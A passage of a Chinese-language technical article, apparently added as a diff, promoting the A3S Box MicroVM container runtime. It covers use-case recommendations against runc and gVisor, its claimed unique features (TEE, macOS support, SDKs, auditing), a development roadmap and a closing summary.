+A3S Box 在 macOS 上通过 Apple HVF 提供原生支持，开发者无需安装 Docker Desktop。52 个兼容命令使得迁移成本几乎为零。TSI 网络模式零配置，适合快速迭代。
+
+**场景二：多租户 SaaS 平台**
+
+推荐：A3S Box（Bridge 模式 + TEE）
+
+多租户场景需要强隔离保证。A3S Box 的硬件虚拟化 + TEE 内存加密提供了最高级别的租户隔离。网络策略支持租户间的流量隔离。审计日志满足合规要求。
+
+**场景三：AI Agent 沙箱执行**
+
+推荐：A3S Box（暖池 + SDK）
+
+AI Agent 需要在隔离环境中执行不可信代码。A3S Box 的 SDK 提供了 Rust/Python/TypeScript 三端统一的编程接口，暖池机制消除了冷启动延迟。七层安全模型确保了即使 Agent 生成的代码是恶意的，也无法逃逸沙箱。
+
+**场景四：机密数据处理**
+
+推荐：A3S Box（TEE 模式 + 密封存储）
+
+处理医疗记录、金融数据或个人隐私信息时，TEE 模式确保数据在处理过程中始终加密。RA-TLS 提供了端到端的证明和加密通信。密封存储确保持久化数据只能在受信任的环境中解密。
+
+**场景五：高性能计算 / 低延迟服务**
+
+推荐：runc (Docker) 或 gVisor
+
+如果安全隔离不是首要需求，且对延迟极度敏感（P99 < 10ms），传统容器的 ~50ms 启动时间和更低的运行时开销可能更合适。
+
+### 20.5 A3S Box 的独特定位
+
+从对比中可以看出，A3S Box 的独特定位在于：
+
+1. **唯一同时支持 MicroVM 隔离和 TEE 机密计算的方案**：Kata Containers 有有限的 TEE 支持，但不如 A3S Box 完整（缺少 RA-TLS、密封存储、重新证明）
+2. **唯一提供 macOS 原生支持的 MicroVM 方案**：通过 libkrun + Apple HVF，开发者可以在 Mac 上获得与 Linux 生产环境一致的体验
+3. **唯一提供三端 SDK 的 MicroVM 方案**：Rust/Python/TypeScript SDK 使得 A3S Box 可以作为库嵌入到应用中，而不仅仅是命令行工具
+4. **唯一内置完整审计系统的 MicroVM 方案**：26 种审计操作、W7 模型、可插拔后端
+
+---
+
+## 21. 未来展望与总结
+
+### 21.1 技术演进路线
+
+A3S Box 的技术演进围绕三个方向展开：
+
+**方向一：扩展 TEE 硬件支持**
+
+当前 A3S Box 完整支持 AMD SEV-SNP。Intel TDX（Trust Domain Extensions）的支持已在架构中预留（`TeeConfig::Tdx` 变体已定义），将在 Intel 服务器平台更广泛部署后实现。未来还将关注 ARM CCA（Confidential Compute Architecture）等新兴的机密计算标准。
+
+**方向二：增强网络策略执行**
+
+当前的网络策略（`IsolationMode::Strict` 和 `Custom`）已在数据模型中完整定义，但运行时执行尚未实现。未来将通过 iptables/nftables 集成实现真正的网络策略执行，支持：
+
+- MicroVM 间的细粒度流量控制
+- 基于标签的网络分段
+- 入站/出站流量的端口级过滤
+- 与 Kubernetes NetworkPolicy 的语义对齐
+
+**方向三：深化安全能力**
+
+- **自定义 Seccomp 配置文件**：当前支持 `Default` 和 `Unconfined` 两种模式，未来将支持 `Custom` 模式，允许用户提供自定义的 Seccomp BPF 配置文件
+- **AppArmor / SELinux 集成**：当前 CLI 已解析这些选项但未执行，未来将实现完整的 MAC（Mandatory Access Control）集成
+- **镜像签名强制验证**：当前签名验证框架已就绪（`SignaturePolicy`、`VerifyResult`），未来将与 Sigstore/cosign 生态集成
+
+### 21.2 生态系统扩展
+
+**OCI 镜像构建**：`a3s-box build` 命令已通过 feature gate 预留，将支持在 MicroVM 内部构建 OCI 镜像——这意味着构建过程本身也受到硬件隔离保护，防止恶意 Dockerfile 攻击宿主机。
+
+**Kubernetes Operator 成熟化**：当前的 `BoxAutoscaler` CRD 处于 `v1alpha1` 阶段，将逐步演进到 `v1beta1` 和 `v1`，增加更多的自动化运维能力：
+
+- 滚动更新策略
+- 金丝雀发布
+- 自动故障恢复
+- 跨可用区调度
+
+**可观测性增强**：
+
+- 更细粒度的 Prometheus 指标（网络 I/O、磁盘 I/O、vsock 延迟）
+- 内置的 Grafana 仪表板模板
+- 审计事件的实时流式传输（WebSocket / gRPC stream）
+
+### 21.3 性能优化方向
+
+**启动时间优化**：虽然 200ms 的冷启动已经很快，但仍有优化空间：
+
+- 内核裁剪：移除 MicroVM 不需要的内核模块，减少内核引导时间
+- 快照恢复：保存已初始化的 VM 快照，从快照恢复而非从头启动
+- 并行初始化：Guest Init 的各步骤尽可能并行执行
+
+**内存优化**：
+
+- KSM（Kernel Same-page Merging）：多个 MicroVM 运行相同镜像时，共享相同的内存页
+- 内存气球（Balloon）：动态调整 VM 的内存分配，回收未使用的内存
+- 惰性内存分配：只在 VM 实际访问时才分配物理内存页
+
+### 21.4 总结
+
+A3S Box 代表了容器运行时的一次范式转换。它不是在现有容器技术上修修补补，而是从"工作负载隔离的本质是什么"这个根本问题出发，得出了一个清晰的答案：
+
+**每个工作负载都应该运行在自己的操作系统内核之上，由硬件虚拟化提供隔离保证，由机密计算提供数据保护，同时保持容器级别的启动速度和开发体验。**
+
+这个答案的实现依赖于几个关键的技术选择：
+
+- **libkrun 作为 VMM**：库形式嵌入，macOS/Linux 双平台原生支持，~200ms 冷启动
+- **Rust 作为实现语言**：内存安全、零成本抽象、跨平台编译、PyO3/napi-rs 生态
+- **最小核心 + 外部扩展的架构**：5 个核心组件保持稳定，14 个扩展点可独立演进
+- **七层纵深防御**：从硬件加密到系统调用过滤，每一层独立增加攻击成本
+- **Docker 兼容的用户体验**：52 个命令，零迁移成本
+
+A3S Box 的 1,466 个测试（覆盖 218 个源文件）确保了这些技术选择的正确实现。而它的模块化设计——七个 Crate 各司其职、通过 Trait 接口松耦合——确保了系统可以持续演进而不失控。
+
+在 AI Agent 时代，安全的代码执行环境不再是可选项，而是基础设施。A3S Box 正是为这个时代而生的运行时——它让每一行不可信的代码都运行在硬件隔离的沙箱中，让每一字节敏感数据都受到硬件加密的保护，同时让开发者感觉就像在使用 Docker 一样简单。
+
+---
+
+> **A3S Box — 让安全成为默认，而非选项。**
+>
+> 🔗 项目文档：[https://a3s-lab.github.io/a3s/](https://a3s-lab.github.io/a3s/) | GitHub：[https://github.com/A3S-Lab/Box](https://github.com/A3S-Lab/Box)
